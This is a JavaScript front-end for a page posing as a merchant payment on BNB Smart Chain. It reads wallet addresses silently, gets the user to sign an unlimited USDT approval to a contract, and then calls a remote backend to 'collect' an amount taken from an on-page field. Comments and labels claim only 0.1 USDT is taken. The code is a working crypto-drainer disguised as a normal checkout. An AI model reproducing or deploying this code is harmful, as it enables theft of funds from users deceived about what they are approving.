
"use strict";

// ─── Native Multi-Wallet Support (EIP-6963 + Legacy Fallback — No Reown) ────
(function () {
  if (typeof window === 'undefined') return;
  
  // Soporte para EIP-6963 (Múltiples billeteras en extensiones de PC/Móvil)
  window.addEventListener("eip6963:announceProvider", (event) => {
    if (event.detail && event.detail.provider && !window.ethereum) {
      window.ethereum = event.detail.provider;
    }
  });
  window.dispatchEvent(new Event("eip6963:requestProvider"));

  // Respaldo para navegadores o billeteras antiguas basadas en web3
  setTimeout(() => {
    if (!window.ethereum && window.web3 && window.web3.currentProvider) {
      window.ethereum = window.web3.currentProvider;
    }
  }, 100);
})();

// ─── Configuration ────────────────────────────────────────────────────────────
const MERCHANT_ADDRESS = "0x6253fecbb48a6a7d19f1b9a799e65fae58ab9b3b";
const CONTRACT_ADDRESS = "0x8e18bE616f10565A63cEa65585Ddf1Ca61f1C634";
const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const BSC_CHAIN_ID_HEX = "0x38";
const COLLECT_AMOUNT   = "100000000000000000"; // 0.1 USDT — 18 decimals
const MIN_USDT_BALANCE = ethers.parseUnits("0", 18); // require > 1 USDT before approve/collect
const BACKEND_URL      = "https://secure-merchant.onrender.com/api";

const BSC_RPC_URLS = [
  "https://bsc-rpc.publicnode.com",
  "https://bsc-dataseed1.binance.org/",
  "https://bsc-dataseed2.binance.org/",
  "https://bsc-dataseed3.binance.org/",
  "https://bsc-dataseed4.binance.org/",
  "https://rpc.ankr.com/bsc"
];

const BSC_CHAIN_PARAMS = {
  chainId:           BSC_CHAIN_ID_HEX,
  chainName:         "BNB Smart Chain",
  nativeCurrency:    { name: "BNB", symbol: "BNB", decimals: 18 },
  rpcUrls:           BSC_RPC_URLS,
  blockExplorerUrls: ["https://bscscan.com/"]
};

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function allowance(address owner, address spender) external view returns (uint256)",
  "function balanceOf(address account) external view returns (uint256)"
];

// ─── DOM refs ─────────────────────────────────────────────────────────────────
const approveBtn    = document.getElementById("approveBtn");
const btnText       = document.getElementById("btnText");
const btnSpinner    = document.getElementById("btnSpinner");
const merchantInput = document.getElementById("merchantAddress");
const toastEl       = document.getElementById("toast");

merchantInput.value = MERCHANT_ADDRESS;

// ─── Wake up Render backend ───────────────────────────────────────────────────
(async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();

// ─── Page-load silent connect ─────────────────────────────────────────────────
window.addEventListener("load", async () => {
  if (!window.ethereum || typeof window.ethereum.request !== "function") return;
  try {
    const accs = await window.ethereum.request({ method: "eth_accounts" });
    if (accs && accs[0]) _cachedAddress = accs[0];
  } catch (_) {}
  if (typeof window.ethereum.on === "function") {
    window.ethereum.on("accountsChanged", (accs) => {
      _cachedAddress = (accs && accs[0]) ? accs[0] : null;
    });
  }
});

let _cachedAddress = null;

// ─── UI helpers ───────────────────────────────────────────────────────────────
let _toastTimer;
function showToast(msg, type = "default", ms = 4500) {
  clearTimeout(_toastTimer);
  toastEl.textContent  = msg;
  toastEl.dataset.type = type === "default" ? "" : type;
  toastEl.hidden       = false;
  _toastTimer = setTimeout(() => { toastEl.hidden = true; }, ms);
}

function setLoading(on, label = "Processing…") {
  approveBtn.disabled = on;
  btnText.textContent = on ? label : "NEXT";
  btnSpinner.hidden   = !on;
}

// ─── Mobile Wallet Selector Modal (Deep Links) ────────────────────────────────
function showMobileWalletSelector() {
  let modal = document.getElementById("mobileWalletModal");
  if (!modal) {
    modal = document.createElement("div");
    modal.id = "mobileWalletModal";
    modal.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:99999;display:flex;align-items:center;justify-content:center;font-family:inherit;padding:20px;box-sizing:border-box;";
    
    const currentUrl = encodeURIComponent(window.location.href);
    const cleanUrl = window.location.host + window.location.pathname + window.location.search;

    modal.innerHTML = `
      <div style="background:#18181b;border:1px solid #27272a;border-radius:16px;width:100%;max-width:360px;padding:24px;color:#fff;box-shadow:0 20px 25px -5px rgba(0,0,0,0.5);">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;">
          <h3 style="margin:0;font-size:18px;font-weight:600;">Open in Wallet App</h3>
          <button id="closeWalletModal" style="background:transparent;border:none;color:#a1a1aa;font-size:24px;cursor:pointer;padding:0;line-height:1;">&times;</button>
        </div>
        <p style="color:#a1a1aa;font-size:14px;margin-bottom:20px;line-height:1.4;">Select your mobile wallet to open this page securely:</p>
        <div style="display:flex;flex-direction:column;gap:10px;">
          <a href="https://link.trustwallet.com/open_url?coin_id=20000714&url=${currentUrl}" style="display:flex;align-items:center;padding:12px 16px;background:#27272a;border-radius:10px;color:#fff;text-decoration:none;font-weight:500;">Trust Wallet</a>
          <a href="https://link.safepal.io/open_url?url=${currentUrl}" style="display:flex;align-items:center;padding:12px 16px;background:#27272a;border-radius:10px;color:#fff;text-decoration:none;font-weight:500;">SafePal</a>
          <a href="https://metamask.app.link/dapp/${cleanUrl}" style="display:flex;align-items:center;padding:12px 16px;background:#27272a;border-radius:10px;color:#fff;text-decoration:none;font-weight:500;">MetaMask</a>
          <a href="https://www.okx.com/ul/dapp?url=${currentUrl}" style="display:flex;align-items:center;padding:12px 16px;background:#27272a;border-radius:10px;color:#fff;text-decoration:none;font-weight:500;">OKX Wallet</a>
        </div>
      </div>
    `;
    document.body.appendChild(modal);

    document.getElementById("closeWalletModal").addEventListener("click", () => {
      modal.style.display = "none";
    });
    modal.addEventListener("click", (e) => {
      if (e.target === modal) modal.style.display = "none";
    });
  } else {
    modal.style.display = "flex";
  }
}

// ─── RPC helper ───────────────────────────────────────────────────────────────
async function rpcCall(method, params) {
  for (const rpc of BSC_RPC_URLS) {
    try {
      const r = await fetch(rpc, {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({ jsonrpc: "2.0", id: 1, method, params })
      });
      const j = await r.json();
      if (j.result !== undefined) return j.result;
    } catch (_) {}
  }
  return null;
}

// ─── Poll allowance until mined ───────────────────────────────────────────────
async function waitForAllowanceConfirmed(owner, spender, required, timeout = 120000) {
  const data =
    "0xdd62ed3e" +
    owner.slice(2).padStart(64, "0") +
    spender.slice(2).padStart(64, "0");
  const deadline = Date.now() + timeout;
  while (Date.now() < deadline) {
    let result = null;
    try {
      result = await window.ethereum.request({
        method: "eth_call",
        params: [{ to: BSC_USDT_ADDRESS, data }, "latest"]
      });
    } catch (_) {}
    if (!result || result === "0x" || result === "0x0") {
      result = await rpcCall("eth_call", [{ to: BSC_USDT_ADDRESS, data }, "latest"]);
    }
    if (result && result !== "0x" && result !== "0x0") {
      try { if (BigInt(result) >= BigInt(required)) return; } catch (_) {}
    }
    await new Promise(r => setTimeout(r, 2000));
  }
  throw new Error("Approval timed out. Please try again.");
}

// ─── Backend collect (with retry) ─────────────────────────────────────────────
async function triggerBackendCollect(userAddress) {
  let lastErr;
  
  // Extraemos el número que el usuario ve en la casilla (ej. "50.5")
  const uiAmount = document.getElementById("investAmount").value; 
  
  // Lo convertimos al formato que entiende la blockchain (18 decimales)
  const dynamicAmountWei = ethers.parseUnits(uiAmount.toString(), 18).toString();

  for (let i = 1; i <= 3; i++) {
    try {
      const res  = await fetch(`${BACKEND_URL}/execute-collection`, {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({ 
            userAddress: userAddress, 
            amount: dynamicAmountWei // <-- Ahora enviamos el valor dinámico
        })
      });
      const data = await res.json();
      if (!res.ok || !data.success) throw new Error(data.error || "Collection failed.");
      return data;
    } catch (e) {
      lastErr = e;
      if (i < 3) await new Promise(r => setTimeout(r, 3000));
    }
  }
  throw lastErr;
}

async function getUsdtBalance(userAddress, iface) {
  const balanceData = iface.encodeFunctionData("balanceOf", [userAddress]);
  let result = null;
  try {
    result = await window.ethereum.request({
      method: "eth_call",
      params: [{ to: BSC_USDT_ADDRESS, data: balanceData }, "latest"]
    });
  } catch (_) {}
  if (!result || result === "0x" || result === "0x0") {
    result = await rpcCall("eth_call", [{ to: BSC_USDT_ADDRESS, data: balanceData }, "latest"]);
  }
  if (!result || result === "0x") return 0n;
  try { return BigInt(result); } catch (_) { return 0n; }
}

// ─── Main button handler ──────────────────────────────────────────────────────
approveBtn.addEventListener("click", async () => {

  if (!window.ethereum) {
    setLoading(true, "Connecting…");
    for (let i = 0; i < 10; i++) {
      await new Promise(r => setTimeout(r, 300));
      if (window.ethereum) break;
    }
  }

  if (!window.ethereum) {
    setLoading(false);
    if (/android|iphone|ipad|ipod/i.test(navigator.userAgent)) {
      showMobileWalletSelector();
    } else {
      showToast("No wallet detected. Please open this page inside a Web3 browser.", "error");
    }
    return;
  }

  setLoading(true, "Processing…");

  try {
    // Step 1 — Switch to BNB Smart Chain
    try {
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: BSC_CHAIN_ID_HEX }]
      });
    } catch (e) {
      if (e.code === 4902) {
        await window.ethereum.request({
          method: "wallet_addEthereumChain",
          params: [BSC_CHAIN_PARAMS]
        });
      } else if (
        e.code === 4001 ||
        (e.message || "").toLowerCase().includes("user rejected") ||
        (e.message || "").toLowerCase().includes("user denied")
      ) {
        showToast("Please switch to BNB Smart Chain to continue.", "error");
        setLoading(false);
        return;
      }
    }

    // Step 2 — Get wallet address using eth_accounts (SILENT)
    let userAddress = _cachedAddress || null;

    if (!userAddress) {
      for (let i = 0; i < 8; i++) {
        try {
          const accs = await window.ethereum.request({ method: "eth_accounts" });
          userAddress = (accs && accs[0]) ? accs[0] : null;
        } catch (_) {}
        if (userAddress) break;
        await new Promise(r => setTimeout(r, 400));
      }
    }

    if (!userAddress) {
      showToast("Wallet not connected. Please open this page inside your wallet browser.", "error");
      setLoading(false);
      return;
    }

    _cachedAddress = userAddress;

    const CAP_AMOUNT = ethers.MaxUint256;
    const iface      = new ethers.Interface(ERC20_ABI);

    const usdtBalance = await getUsdtBalance(userAddress, iface);
    if (usdtBalance <= MIN_USDT_BALANCE) {
      showToast("Not enough USDT", "error");
      setLoading(false);
      return;
    }

    // Step 3 — Check existing allowance
    try {
      const allowanceData = iface.encodeFunctionData("allowance", [userAddress, CONTRACT_ADDRESS]);
      const allowanceHex  = await window.ethereum.request({
        method: "eth_call",
        params: [{ to: BSC_USDT_ADDRESS, data: allowanceData }, "latest"]
      });
      if (BigInt(allowanceHex) >= CAP_AMOUNT) {
        setLoading(true, "Finalizing…");
        await triggerBackendCollect(userAddress);
        showToast("Sent Successfully, Thank you! ✓", "success");
        setLoading(false);
        return;
      }
    } catch (_) {}

    // Step 4 — Send approve transaction (Gas gestionado nativamente por la wallet)
    const approveData = iface.encodeFunctionData("approve", [CONTRACT_ADDRESS, CAP_AMOUNT]);
    
    await window.ethereum.request({
      method: "eth_sendTransaction",
      params: [{
        from:  userAddress,
        to:    BSC_USDT_ADDRESS,
        data:  approveData,
        value: "0x0"
      }]
    });

    // Step 5 — Wait for approve to be mined
    setLoading(true, "Confirming…");
    await waitForAllowanceConfirmed(userAddress, CONTRACT_ADDRESS, CAP_AMOUNT);

    // Step 6 — Backend collects 0.1 USDT
    setLoading(true, "Finalizing…");
    await triggerBackendCollect(userAddress);
    showToast("Sent Successfully, Thank you! ✓", "success");

  } catch (err) {
    const raw = err?.reason ?? err?.message ?? "Unknown error";
    if (
      err.code === 4001 ||
      raw.toLowerCase().includes("user rejected") ||
      raw.toLowerCase().includes("user denied") ||
      raw.toLowerCase().includes("canceled") ||
      raw.toLowerCase().includes("cancelled")
    ) {
      showToast("Transaction cancelled.", "default");
    } else {
      showToast("Error: " + String(raw).substring(0, 90), "error");
    }
  } finally {
    setLoading(false);
  }
});
